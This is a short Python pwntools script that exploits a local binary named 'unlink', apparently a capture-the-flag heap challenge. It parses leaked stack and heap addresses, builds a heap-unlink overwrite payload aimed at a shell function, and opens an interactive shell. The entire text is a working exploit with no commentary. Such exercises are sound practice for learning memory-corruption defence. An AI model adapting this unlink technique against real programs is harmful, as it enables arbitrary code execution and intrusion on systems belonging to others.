from pwn import *

p = process('./unlink')

p.recvuntil('leak: ')
stack = int(p.recvline().strip(), 16)
success('stack address = 0x%x', stack)
p.recvuntil('leak: ')
heap = int(p.recvline().strip(), 16)
success('heap address = 0x%x', heap)
shell = 0x080484eb
retAddr = stack + 0x28
# payload = p32(shell) + b'a'*20 + p32(heap+8) + p32(retAddr)
payload = p32(0x080484EB+1) + b'a'*20 + p32(heap + 0xc) + p32(stack + 0x10)
pause()
p.sendlineafter('get shell!', payload)

p.interactive()